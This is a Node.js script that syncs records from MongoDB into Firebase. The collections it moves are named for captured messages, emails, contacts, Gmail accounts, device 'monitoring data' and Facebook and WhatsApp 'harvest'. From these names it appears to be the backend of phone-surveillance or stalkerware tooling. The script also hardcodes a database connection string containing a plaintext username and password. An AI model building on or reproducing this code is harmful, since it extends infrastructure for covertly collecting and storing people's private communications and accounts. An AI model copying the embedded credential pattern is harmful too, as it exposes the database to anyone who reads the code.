const mongoose = require('mongoose');
const { db, rtdb } = require('./config/firebase');
require('dotenv').config();

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://dbuser:Bil%40l112@cluster0.ey6gj6g.mongodb.net/mob_notifications', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

// Import models
const User = require('./models/User');
const Device = require('./models/Device');
const Notification = require('./models/Notification');
const Email = require('./models/Email');
const SMS = require('./models/SMS');
const CallLog = require('./models/CallLog');
const Contact = require('./models/Contact');
const GmailAccount = require('./models/GmailAccount');
const CaptureMessage = require('./models/CaptureMessages');
const CaptureEmail = require('./models/CaptureEmails');
const CaptureVideo = require('./models/CaptureVideos');

async function syncToFirebase() {
  try {
    console.log('🔄 SYNCING MONGODB DATA TO FIREBASE\n');
    console.log('=' .repeat(60));

    // Sync Notifications
    console.log('\n🔔 SYNCING NOTIFICATIONS:');
    const notifications = await Notification.find({}).limit(100);
    console.log(`Found ${notifications.length} notifications in MongoDB`);
    
    for (const notification of notifications) {
      const docRef = db.collection('notifications').doc();
      await docRef.set({
        ...notification.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${notifications.length} notifications to Firebase`);

    // Sync Messages (Capture Messages)
    console.log('\n💬 SYNCING MESSAGES:');
    const messages = await CaptureMessage.find({}).limit(100);
    console.log(`Found ${messages.length} messages in MongoDB`);
    
    for (const message of messages) {
      const docRef = db.collection('messages').doc();
      await docRef.set({
        ...message.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${messages.length} messages to Firebase`);

    // Sync Contacts
    console.log('\n👤 SYNCING CONTACTS:');
    const contacts = await Contact.find({}).limit(100);
    console.log(`Found ${contacts.length} contacts in MongoDB`);
    
    for (const contact of contacts) {
      const docRef = db.collection('contacts').doc();
      await docRef.set({
        ...contact.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${contacts.length} contacts to Firebase`);

    // Sync Emails
    console.log('\n📧 SYNCING EMAILS:');
    const emails = await Email.find({}).limit(100);
    console.log(`Found ${emails.length} emails in MongoDB`);
    
    for (const email of emails) {
      const docRef = db.collection('emails').doc();
      await docRef.set({
        ...email.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${emails.length} emails to Firebase`);

    // Sync Gmail Accounts
    console.log('\n📮 SYNCING GMAIL ACCOUNTS:');
    const gmailAccounts = await GmailAccount.find({}).limit(100);
    console.log(`Found ${gmailAccounts.length} Gmail accounts in MongoDB`);
    
    for (const account of gmailAccounts) {
      const docRef = db.collection('gmail_accounts').doc();
      await docRef.set({
        ...account.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${gmailAccounts.length} Gmail accounts to Firebase`);

    // Sync Users/Accounts
    console.log('\n👥 SYNCING USERS/ACCOUNTS:');
    const users = await User.find({}).limit(100);
    console.log(`Found ${users.length} users in MongoDB`);
    
    for (const user of users) {
      const docRef = db.collection('accounts').doc();
      await docRef.set({
        ...user.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${users.length} users to Firebase`);

    // Sync Devices (Monitoring Data)
    console.log('\n📱 SYNCING DEVICES (MONITORING DATA):');
    const devices = await Device.find({}).limit(100);
    console.log(`Found ${devices.length} devices in MongoDB`);
    
    for (const device of devices) {
      const docRef = db.collection('monitoring_data').doc();
      await docRef.set({
        ...device.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${devices.length} devices to Firebase`);

    // Sync Facebook Harvest (Capture Messages with Facebook platform)
    console.log('\n📘 SYNCING FACEBOOK HARVEST:');
    const facebookMessages = await CaptureMessage.find({ platform: 'facebook' }).limit(100);
    console.log(`Found ${facebookMessages.length} Facebook messages in MongoDB`);
    
    for (const message of facebookMessages) {
      const docRef = db.collection('facebook_harvest').doc();
      await docRef.set({
        ...message.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${facebookMessages.length} Facebook messages to Firebase`);

    // Sync WhatsApp Harvest (Capture Messages with WhatsApp platform)
    console.log('\n💚 SYNCING WHATSAPP HARVEST:');
    const whatsappMessages = await CaptureMessage.find({ platform: 'whatsapp' }).limit(100);
    console.log(`Found ${whatsappMessages.length} WhatsApp messages in MongoDB`);
    
    for (const message of whatsappMessages) {
      const docRef = db.collection('whatsapp_harvest').doc();
      await docRef.set({
        ...message.toObject(),
        firebaseId: docRef.id,
        syncedAt: new Date()
      });
    }
    console.log(`✅ Synced ${whatsappMessages.length} WhatsApp messages to Firebase`);

    // Update Realtime Database with sync status
    console.log('\n⚡ UPDATING REALTIME DATABASE:');
    await rtdb.ref('sync_status').set({
      lastSync: new Date().toISOString(),
      totalRecords: {
        notifications: notifications.length,
        messages: messages.length,
        contacts: contacts.length,
        emails: emails.length,
        gmail_accounts: gmailAccounts.length,
        accounts: users.length,
        monitoring_data: devices.length,
        facebook_harvest: facebookMessages.length,
        whatsapp_harvest: whatsappMessages.length
      }
    });
    console.log('✅ Updated Realtime Database with sync status');

    console.log('\n' + '=' .repeat(60));
    console.log('✅ Firebase sync completed successfully!');
    console.log('\n📊 SUMMARY:');
    console.log(`- Notifications: ${notifications.length}`);
    console.log(`- Messages: ${messages.length}`);
    console.log(`- Contacts: ${contacts.length}`);
    console.log(`- Emails: ${emails.length}`);
    console.log(`- Gmail Accounts: ${gmailAccounts.length}`);
    console.log(`- Users/Accounts: ${users.length}`);
    console.log(`- Devices/Monitoring: ${devices.length}`);
    console.log(`- Facebook Harvest: ${facebookMessages.length}`);
    console.log(`- WhatsApp Harvest: ${whatsappMessages.length}`);

  } catch (error) {
    console.error('❌ Error syncing to Firebase:', error);
  } finally {
    mongoose.connection.close();
  }
}

syncToFirebase(); 